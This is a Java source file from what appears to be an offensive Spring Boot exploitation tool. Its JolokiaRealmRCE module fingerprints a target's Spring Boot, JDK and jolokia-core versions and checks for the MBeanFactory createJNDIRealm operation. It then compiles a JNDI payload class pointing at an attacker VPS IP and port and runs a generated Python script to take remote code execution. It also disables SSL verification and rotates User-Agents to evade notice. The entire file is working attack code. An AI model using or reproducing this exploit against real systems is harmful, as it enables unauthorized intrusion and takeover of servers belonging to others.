package src.main.module;

import src.main.LoadLib.ClassCom.ClsComp;
import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class JolokiaRealmRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;

    public JolokiaRealmRCE(String address, String vpsIP, String vpsPort){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }

    public void Result1(ResultCallback callback) {
        String llib = "jdk";
        String llib1 = "jolokia-core";
        String api = "/jolokia";
        String site = address + "/env";
        String MBFact = "type=MBeanFactory";
        String createRe = "createJNDIRealm";
        String ua = "";
        String data = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent", ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)){
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1+ "-(\\d+\\.\\d+\\.\\d)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    text = "当前jolokia-core版本为: " + matcher1.group(1);
                    callback.onResult(text);
                    URL obj1 = new URL(address +  api + "/list");
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent", ua);
                    conn1.setRequestMethod("GET");
                    conn1.setDoOutput(true);
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains(MBFact)) && response1.toString().contains(createRe)) {
                        text = MBFact + "和" + createRe;
                        callback.onResult(text);
                        ClsComp cc = new ClsComp(vpsIP,vpsPort);
                        // 通用代码
                        boolean isModify = cc.modifyJavaClassFile("JNDIObject/JolokiaLogbackTemplate.java","JolokiaRealm.java",callback);
                        if (isModify) {
                            try {
                                cc.CompileJava("JolokiaRealm", "JolokiaRealm", callback);
                            } catch (IOException e) {
                                return;
                            }
                            text = "class文件写入成功";
                            callback.onResult(text);
                            ClsComp cc1 = new ClsComp(address,vpsIP,"");
                            boolean isModify1 = cc1.modifyPythonFile("RealmObject/RealmJolokiaTemplate.py","RealmJolokia.py",callback);
                            if (isModify1){
                                text = "py文件写入成功";
                                callback.onResult(text);
                                // 默认python3
                                String pyFilePath = System.getProperty("user.dir") + "resources/RealmJolokia.py";
                                String pyInterpreter = "python3";
                                ProcessBuilder processBuilder = new ProcessBuilder(pyInterpreter, pyFilePath);
                                try {
                                    Process process = processBuilder.start();
                                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                    String line;
                                    while ((line = reader.readLine()) != null) {
                                        callback.onResult(line);
                                    }
                                    // 等待进程结束并获取退出代码
                                    int exitCode = process.waitFor();
                                    text = "Python脚本执行完毕，退出代码: " + exitCode;
                                    callback.onResult(text);
                                } catch (IOException | InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }else {
                                text = "py文件写入失败";
                                callback.onResult(text);
                            }
                        }else{
                            text = "文件写入失败";
                            callback.onResult(text);
                        }
                    }else{
                        text = "未找到" + MBFact + "和" + createRe;
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else {
                text = "发起请求失败";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){

    }

    public void Exp(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
                callback.onResult(text);
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                Result1(callback);
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
